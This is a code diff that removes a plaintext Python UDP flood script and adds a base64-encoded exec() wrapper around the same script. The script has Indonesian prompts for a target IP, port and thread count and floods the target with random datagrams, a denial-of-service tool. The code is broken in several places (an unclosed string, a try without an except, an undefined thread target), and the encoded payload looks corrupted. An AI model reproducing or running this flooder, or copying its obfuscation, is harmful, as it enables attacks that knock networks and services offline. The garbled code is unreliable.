@@ -1,25 +1,2 @@
-import time
-import socket
-import random
-import threading
-
-print("""
-\033[93m
-<< SUBSCRIBE DogX >>
-
-ip = str(input("Masukan Ip Target:"))
-port = int(input("Kaaih Port Kopi Target:"))
-times = int(input("Times:"))
-threads = int(input("threads:"))
-def run():
-	data = random._urandom(1879)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-				# Threads
-for y in range(threads):
-	th = threading.Thread(target = wt)
-	th.start()
+import base64
+exec(base64.b64decode('aW1wb3J0IHRpbWUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCByYW5kb20NCmltcG9ydCB0aHJlYWRpbmcNCg0KcHJpbnQoIpbnQoIiIiDQpcMDMzWzkzbQ0KPDwgU1VCU0NSSUJFIERvZ1ggPj4NCg0KaXAgPSBzdHIoaW5wdXQoIk1hc3VrYW4gSXAgVGFyZ2V0OiIpKQ0KcG9ydCcG9ydCA9IGludChpbnB1dCgiS2FhaWggUG9ydCBLb3BpIFRhcmdldDoiKSkNCnRpbWVzID0gaW50KGlucHV0KCJUaW1lczoiKSkNCnRocmVhZHMgPSBHMgPSBpbnQoaW5wdXQoInRocmVhZHM6IikpDQpkZWYgcnVuKCk6DQoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxODc5KQ0KCXdoaWxlIFRydWU6DQoJU6DQoJCXRyeToNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkNCgkJCWFkZHIgPSAoc3RyKGlwKyKGlwKSxpbnQocG9ydCkpDQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6DQoJCQkJcy5zZW5kdG8oZGF0YSxhZGRyKQ0KCQkJCSMgVGhyZWFkcw0KZmcw0KZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6DQoJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHd0KQ0KCXRoLnN0YXJ0KCk='))
